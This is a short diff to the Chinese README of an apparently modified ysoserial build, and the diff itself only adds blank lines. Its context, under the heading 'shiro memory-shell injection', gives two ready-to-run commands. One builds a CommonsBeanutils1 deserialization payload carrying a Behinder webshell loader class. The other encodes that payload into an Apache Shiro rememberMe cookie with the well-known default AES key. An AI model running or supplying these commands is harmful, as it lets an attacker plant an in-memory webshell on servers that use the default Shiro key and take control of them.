@@ -4,8 +4,11 @@
 ### shiro 内存马注入
 
 使用对应链进行生成反序列化文件
+
 `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 classfile:./Poc/shell/BehinderLoader.class > demo.ser`
+
 指定加密模式和反序列化文件生成对应的 rememberMe
+
 `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ShiroRememberMeEncode cbc:kPH+bIxk5D2deZiIxcaaaA==:./demo.ser`
 
 ### 更新日志
